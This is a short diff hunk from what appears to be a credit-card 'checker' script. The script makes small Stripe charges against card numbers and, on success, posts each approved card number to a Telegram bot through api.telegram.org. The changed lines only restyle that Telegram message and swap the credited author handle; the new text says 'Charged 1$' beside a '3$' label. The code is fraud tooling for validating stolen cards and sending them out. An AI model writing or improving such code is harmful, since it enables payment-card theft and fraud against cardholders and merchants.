@@ -207,11 +207,12 @@ for y in y:
 	if 'success' in msg:
 	    print(Fore.GREEN+f"{ccx} >> STRIPE CCN CHARGE 3$ ✅  ")
 	    requests.post(f"""https://api.telegram.org/bot{token}/sendmessage?chat_id={ID}&text=
-𝗖𝗮𝗿𝗱 -» {ccx}
-         
-𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» STRIPE CCN CHARGE 3$✅ 
-         
-𝗕𝗬 : @roronoa_robot""")
+𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
+
+𝗖𝗮𝗿𝗱 -» {ccx}        
+𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -» STRIPE CCN CHARGE 3$✅
+𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Charged 1$✅        
+𝗕𝗬 : @fahimhossen27""")
 
     	
 	else:
